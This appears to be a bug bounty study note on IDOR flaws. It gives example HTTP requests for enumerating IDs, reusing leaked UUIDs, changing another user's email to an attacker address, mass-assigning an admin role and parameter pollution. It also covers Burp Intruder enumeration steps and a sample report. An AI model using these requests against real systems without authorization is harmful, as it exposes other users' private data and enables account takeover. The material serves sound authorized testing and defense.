# IDOR — Insecure Direct Object Reference

> **OWASP:** A01:2025 — Broken Access Control  
> **Severity:** High/Critical — direct access to other users' data  
> **Bounty Range:** $500 – $50,000+ (scales with data sensitivity)

---

## What is IDOR?

IDOR happens when an application uses user-controllable input to access objects directly without verifying if the requesting user has permission. Change `?user_id=1` to `?user_id=2` and you're reading someone else's data.

---

## 5 Attack Types

### 01 · Numeric ID Enumeration
```
GET /api/orders/1337   → your order
GET /api/orders/1338   → victim's order — IDOR!

Other targets:
/api/users/2/profile
/invoice/download/5523
/receipt/88
/ticket/9901
```

### 02 · UUID / GUID Bypass
```
UUIDs look random but get leaked elsewhere:
- GET /api/files/list        → contains other users' UUIDs
- GET /api/docs/550e8400...  → access doc with leaked UUID

Where to find UUIDs:
- JS source files
- API response fields
- Password reset emails
- Shared/public links
```

### 03 · Horizontal Privilege Escalation
```
Same role, different account:

PUT /api/account/2/email
Body: {"email": "attacker@evil.com"}
→ 200 OK — you changed user 2's email!

GET /api/user/2/messages
→ 200 OK — you read user 2's messages!
```

### 04 · Vertical Privilege Escalation (Mass Assignment)
```
Regular user accessing admin endpoints:

GET  /admin/users          → list all users
POST /admin/promote/2      → promote user to admin
GET  /api/admin/config     → server config

Mass assignment:
POST /api/users
Body: {"name":"test","role":"admin","verified":true}
→ role and verified accepted — privilege escalation!
```

### 05 · Parameter Pollution IDOR
```
Duplicate params confuse server parsing:

GET /export?user_id=1&user_id=2
→ Some parsers use last value → returns user 2's data!

GET /report?uid=MINE&uid=VICTIM
POST body: user=1&user=2
```

---

## Where to Hunt

| Location | Example | Notes |
|----------|---------|-------|
| Invoice/orders | `/invoice/1337` | High value — financial data |
| User profiles | `/user/2/profile` | PII — name, address, email |
| File downloads | `?file=user2_report.pdf` | Documents, exports |
| Password reset | `?token=USER2_TOKEN` | Token reuse = account takeover |
| API JSON fields | `{"id":2}` in body | Swap ID in POST/PUT body |
| Admin endpoints | `/admin/users/2` | Vertical escalation |
| Messaging | `/messages/inbox/2` | Read others' messages |

---

## Testing Methodology

```
Step 1 — Create 2 accounts (Attacker + Victim)
Step 2 — With Victim account, perform all actions
         (create order, upload file, update profile)
Step 3 — Note all IDs, tokens, filenames used
Step 4 — Switch to Attacker account
Step 5 — Try accessing Victim's IDs/resources
Step 6 — Test ALL HTTP methods: GET, PUT, POST, DELETE, PATCH

Burp Suite workflow:
1. Capture request with your ID
2. Send to Repeater
3. Change ID to another user's ID
4. Compare response — different data = IDOR!
```

---

## Automation with Burp Intruder

```
1. Capture: GET /api/invoice/§1337§
2. Set payload: Numbers 1-10000, step 1
3. Filter responses by Content-Length
   (different length = different data = IDOR)
4. Or filter by status: 200 vs 403
```

---

## Checklist

```
☐  Change numeric IDs in every URL param and POST body
☐  Test GUIDs found in one response in other endpoints
☐  Try accessing other users' /profile /orders /docs
☐  Test admin endpoints with low-privilege token
☐  Check indirect refs: filename=, token=, hash= params
☐  Automate with Burp Intruder — enumerate IDs 1-1000
☐  Test all HTTP methods — sometimes DELETE works even if GET doesn't
☐  Check API versioning: /v1/ blocked but /v2/ not?
```

---

## Report Template

```
Title: IDOR in Invoice Download — Access Any User's Invoice

Severity: High (CVSS 7.5)

Endpoint: GET /api/invoice/{id}/download

Steps to Reproduce:
1. Log in as User A, download invoice — note ID: 1337
2. Log out, log in as User B
3. Request GET /api/invoice/1338/download
4. Observe: User A's invoice returned to User B

Impact:
Any authenticated user can access invoices of all other users
including financial data, addresses, and payment information.

Remediation:
Verify that the authenticated user owns the requested resource
before returning it. Never rely on ID obscurity for access control.
```

---

*Daily Bug Bounty notes — follow for more.*
